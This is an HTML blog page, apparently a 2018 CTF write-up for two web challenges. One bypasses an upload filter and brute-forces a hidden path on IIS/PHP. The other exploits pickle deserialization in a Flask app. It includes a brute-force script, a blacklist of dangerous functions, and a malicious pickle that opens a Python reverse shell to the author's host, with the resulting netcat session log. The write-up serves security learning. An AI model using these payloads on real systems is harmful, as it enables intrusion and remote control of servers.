@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          XCTF-HIBTweb writeup - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/04/xctf-hibtweb-writeup/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>XCTF-HIBTweb writeup</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-04-14
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>两个主要功能页面</p>
+<ul>
+<li>index.html   上传图片 上传之后会返回图片重命名后的名字</li>
+<li>pic.php?filename=xxx.png    返回图片的长、宽</li>
+</ul>
+<p>还有一个很重要的信息，IIS+php <img src="http://blog.kingkk.com/wp-content/uploads/2018/04/6af0e9dc49da3c967c81e97aa29148eb.png" alt> 先试着上传一个php文件 <img src="http://blog.kingkk.com/wp-content/uploads/2018/04/065f21cdfbff65ec89c609d10cae2b8c.png" alt> 发现做了过滤，可以用一个简单的方法绕过 文件名后加一个空格，windows下会自动去掉 <code>1.php</code> （后面有一个空格） <img src="http://blog.kingkk.com/wp-content/uploads/2018/04/c7c0e8b93e16db6b3d32944e26f7c1c8.png" alt> 上传成功 <img src="http://blog.kingkk.com/wp-content/uploads/2018/04/954b95edcd1c8626004ab2ede26c899a.png" alt> 接下来就是找文件被放到了哪里（自己比赛的时候一直是以为上传完之后文件就被删了，要去upload下竞速找文件。。） 这里应该首先想到windows平台下php文件解析的一个bug 主要是由于php使用了windows提供的一个<code>FindFirstFileExW()</code>系统api 在判断文件路径时，有如下特性<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">大于号<span class="comment">(&gt;)</span>相等于通配符问号<span class="comment">(?)</span> </span><br><span class="line">小于号<span class="comment">(&lt;)</span>相当于通配符星号<span class="comment">(*)</span> </span><br><span class="line">双引号<span class="comment">(")</span>相当于点字符<span class="comment">(.)</span></span><br></pre></td></tr></table></figure></p>
+<p>详细文章可看如下链接</p>
+<p><a href="http://www.freebuf.com/column/164698.html" target="_blank" rel="noopener">http://www.freebuf.com/column/164698.html</a></p>
+<p>php中的<code>getimagesize()</code>函数恰好在识别文件路径时调用了<code>FindFirstFileExW()</code>底层函数 这样就可以顺利的将突破点放在pic.php文件中，利用如下payload<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="string">//47.90.97.18</span><span class="function">:9999</span>/pic.php?filename=<span class="string">../8</span>&lt;<span class="string">/1523519201.jpg</span></span><br></pre></td></tr></table></figure></p>
+<p>前缀正确时会返回图片信息，否则error 接下来就可以写脚本爆破了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf8</span></span><br><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line">str_rang = string.ascii_letters+string.digits</span><br><span class="line">base_url = <span class="string">"http://47.90.97.18:9999/pic.php?filename=../&#123;&#125;&#123;&#125;&lt;/1523458638.png"</span></span><br><span class="line">img_dir = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> str_rang:</span><br><span class="line">		url = base_url.format(img_dir, i)</span><br><span class="line">		r = requests.get(url)</span><br><span class="line">		<span class="keyword">if</span> r.text != <span class="string">"image error"</span>:</span><br><span class="line">			img_dir+=i</span><br><span class="line">			print(img_dir)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>路径如下</p>
+<p>87194f13726af7cee27ba2cfe97b60df</p>
+<p>访问一下可以直接执行，接下来就可以上菜刀拿flag了  </p>
+<h1 id="Python’s-revenge"><a href="#Python’s-revenge" class="headerlink" title="Python’s revenge"></a>Python’s revenge</h1><p>一个代码审计，先上代码（据说和强网杯题目类似，可惜那时根本没看这题目，如今好好研究下）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> unicode_literals</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response, redirect, url_for, session</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template, flash, redirect, url_for, request</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> safe_str_cmp</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> b64d</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64e</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> filecmp</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> dircache</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"><span class="keyword">import</span> popen2</span><br><span class="line"><span class="keyword">import</span> code</span><br><span class="line"><span class="keyword">import</span> codeop</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> posixfile</span><br><span class="line"></span><br><span class="line">SECRET_KEY = <span class="string">'you will never guess'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'.secret'</span>):</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">".secret"</span>, <span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        secret = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits)</span><br><span class="line">                         <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>))</span><br><span class="line">        f.write(secret)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">".secret"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    cookie_secret = f.read().strip()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(__name__)</span><br><span class="line"></span><br><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'cnt'</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    remembered_str = <span class="string">'Hello, here\'s what we remember for you. And you can change, delete or extend it.'</span></span><br><span class="line">    new_str = <span class="string">'Hello fellow zombie, have you found a tasty brain and want to remember where? Go right here and enter it:'</span></span><br><span class="line">    location = getlocation()</span><br><span class="line">    <span class="keyword">if</span> location == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"clear"</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, txt=remembered_str, location=location)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/clear')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">()</span>:</span></span><br><span class="line">    flash(<span class="string">"Reminder cleared!"</span>)</span><br><span class="line">    response = redirect(url_for(<span class="string">'home'</span>))</span><br><span class="line">    response.set_cookie(<span class="string">'location'</span>, max_age=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/reminder', methods=['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reminder</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        location = request.form[<span class="string">"reminder"</span>]</span><br><span class="line">        <span class="keyword">if</span> location == <span class="string">''</span>:</span><br><span class="line">            flash(<span class="string">"Message cleared, tell us when you have found more brains."</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">"We will remember where you find your brains."</span>)</span><br><span class="line">        location = b64e(pickle.dumps(location))</span><br><span class="line">        cookie = make_cookie(location, cookie_secret)</span><br><span class="line">        response = redirect(url_for(<span class="string">'home'</span>))</span><br><span class="line">        response.set_cookie(<span class="string">'location'</span>, cookie)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    location = getlocation()</span><br><span class="line">    <span class="keyword">if</span> location == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">"clear"</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'reminder.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        super(FilterException, self).__init__(</span><br><span class="line">            <span class="string">'The callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimesException</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(TimesException, self).__init__(</span><br><span class="line">            <span class="string">'Call func too many times!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">        session[<span class="string">'cnt'</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> session[<span class="string">'cnt'</span>]</span><br><span class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> args[<span class="number">0</span>].stack:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> black_type_list:</span><br><span class="line">                <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</span><br><span class="line">            <span class="keyword">if</span> session[<span class="string">'cnt'</span>] &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> TimesException()</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(strs)</span>:</span></span><br><span class="line">    reload(pickle)</span><br><span class="line">    files = StringIO(strs)</span><br><span class="line">    unpkler = pickle.Unpickler(files)</span><br><span class="line">    unpkler.dispatch[pickle.REDUCE] = _hook_call(</span><br><span class="line">        unpkler.dispatch[pickle.REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlocation</span><span class="params">()</span>:</span></span><br><span class="line">    cookie = request.cookies.get(<span class="string">'location'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span></span><br><span class="line">    (digest, location) = cookie.split(<span class="string">"!"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> safe_str_cmp(calc_digest(location, cookie_secret), digest):</span><br><span class="line">        flash(<span class="string">"Hey! This is not a valid cookie! Leave me alone."</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    location = loads(b64d(location))</span><br><span class="line">    <span class="keyword">return</span> location</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_cookie</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"%s!%s"</span> % (calc_digest(location, secret), location)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_digest</span><span class="params">(location, secret)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sha256(<span class="string">"%s%s"</span> % (location, secret)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>, port=<span class="number">5051</span>)</span><br></pre></td></tr></table></figure></p>
+<p>接下来就是阅读代码锁定漏洞可能发生的位置（实在看的头晕可以追踪black_type_list这个黑名单列表）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(strs)</span>:</span></span><br><span class="line">    reload(pickle)</span><br><span class="line">    files = StringIO(strs)</span><br><span class="line">    unpkler = pickle.Unpickler(files)</span><br><span class="line">    unpkler.dispatch[pickle.REDUCE] = _hook_call(</span><br><span class="line">        unpkler.dispatch[pickle.REDUCE])</span><br><span class="line">    <span class="keyword">return</span> unpkler.load()</span><br></pre></td></tr></table></figure></p>
+<p>主要就是这个loads函数，利用了pickle这个库，对数据进行了反序列化，导致反序列化漏洞的产生 寻找一下调用关系<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">reminder--&gt;getlocation()--&gt;loads()</span></span><br></pre></td></tr></table></figure></p>
+<p>其中反序列化的原始信息以base64以及哈希后的值，被保存在cookie的location中，当哈希值与base64值不相同时会重置cookie 哈希的内容中除了反序列化的base64还有一个随机数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret = <span class="string">''</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>))</span><br></pre></td></tr></table></figure></p>
+<p>四位数的随机数，可以利用最初的cookie爆破一下这个随机数（4**62,大概一千多万）<br>最后的结果<code>hitb</code> 有了这个随机数，我们就可以生成自己的恶意cookie，绕过哈希验证了 接下来就时构造恶意函数的时候了，代码中黑名单过滤了好多函数（当时就是被卡死在这里）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br></pre></td></tr></table></figure></p>
+<p>最后，看了下大佬用的函数（说实话我也不是很清楚干啥的，应该也是执行一些系统命令）</p>
+<p>platform.popen</p>
+<p>接下来构造序列化函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">import</span> platform</span><br><span class="line">		<span class="keyword">return</span> (platform.popen,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"自己的IP\",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,)) </span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">shell_code = cPickle.dumps(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./1.txt'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(shell_code)</span><br></pre></td></tr></table></figure></p>
+<p>将序列话后的代码进行base64加密，然后再与hitb进行sha256哈希，构造对应的cookie 在自己的主机上<code>nc -nvlp 23333</code> 然后来到reminder页面，刷新，并替换cookie <img src="http://blog.kingkk.com/wp-content/uploads/2018/04/65310fbee0c40baf385649ee2b508b95.png" alt> 成功反向连接<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Ncat:</span> <span class="string">Version</span> <span class="number">6.40</span> <span class="string">(</span> <span class="string">http://nmap.org/ncat</span> <span class="string">)</span></span><br><span class="line"><span class="attr">Ncat:</span> <span class="string">Listening</span> <span class="string">on</span> <span class="string">:::23333</span></span><br><span class="line"><span class="attr">Ncat:</span> <span class="string">Listening</span> <span class="string">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">:23333</span></span><br><span class="line"><span class="attr">Ncat:</span> <span class="string">Connection</span> <span class="string">from</span> <span class="number">47.75</span><span class="number">.151</span><span class="number">.118</span><span class="string">.</span></span><br><span class="line"><span class="attr">Ncat:</span> <span class="string">Connection</span> <span class="string">from</span> <span class="number">47.75</span><span class="number">.151</span><span class="number">.118</span><span class="string">:54836.</span></span><br><span class="line"><span class="string">/bin/sh:</span> <span class="attr">0:</span> <span class="string">can't</span> <span class="string">access</span> <span class="string">tty;</span> <span class="string">job</span> <span class="string">control</span> <span class="string">turned</span> <span class="string">off</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></p>
